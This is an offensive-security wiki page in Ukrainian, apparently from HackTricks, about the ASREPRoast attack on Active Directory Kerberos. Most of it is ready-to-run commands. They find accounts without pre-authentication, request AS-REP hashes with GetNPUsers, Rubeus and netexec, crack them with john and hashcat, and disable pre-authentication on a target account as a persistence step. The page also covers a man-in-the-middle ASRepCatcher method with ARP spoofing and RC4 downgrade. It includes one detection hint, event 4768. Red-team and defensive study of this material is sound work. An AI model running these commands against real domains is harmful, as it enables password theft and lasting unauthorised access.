# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast — це атака на безпеку, яка експлуатує користувачів, що не мають атрибуту **Kerberos pre-authentication required attribute**. По суті, ця вразливість дозволяє зловмисникам запитувати автентифікацію для користувача у Domain Controller (DC) без необхідності знати пароль користувача. DC потім відповідає повідомленням, зашифрованим ключем, похідним від пароля користувача, яке зловмисники можуть намагатися розшифрувати офлайн, щоб дізнатися пароль користувача.

Основні вимоги для цієї атаки:

- **Lack of Kerberos pre-authentication**: цільові користувачі не повинні мати ввімкнену цю функцію безпеки.
- **Connection to the Domain Controller (DC)**: зловмисникам потрібен доступ до DC, щоб надсилати запити та отримувати зашифровані повідомлення.
- **Optional domain account**: наявність доменного облікового запису дозволяє зловмисникам ефективніше ідентифікувати вразливих користувачів через LDAP-запити. Без такого облікового запису зловмисникам доведеться вгадувати імена користувачів.

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Запит повідомлення AS_REP
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus згенерує 4768 з encryption type 0x17 і preauth type 0.

#### Quick one-liners (Linux)

- Перерахуйте спочатку потенційні цілі (наприклад, зі leaked build paths) за допомогою Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Отримайте AS-REP одного користувача навіть з **порожнім** паролем, використовуючи `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec також виводить інформацію про LDAP signing/channel binding posture).
- Зламуйте за допомогою `hashcat out.asreproast /path/rockyou.txt` – він автоматично визначає **-m 18200** (etype 23) для AS-REP roast hashes.

### Злам
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Персистентність

Не потрібно вимагати **preauth** для користувача, на якого у вас є права **GenericAll** (або права на запис властивостей):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast without credentials

Атакуючий може використати позицію man-in-the-middle, щоб перехоплювати AS-REP packets під час їх проходження мережею, не покладаючись на те, що Kerberos pre-authentication вимкнено. Отже, це працює для всіх користувачів у VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) дозволяє нам зробити це. Крім того, інструмент змушує клієнтські робочі станції використовувати RC4 шляхом зміни Kerberos negotiation.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Джерела

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
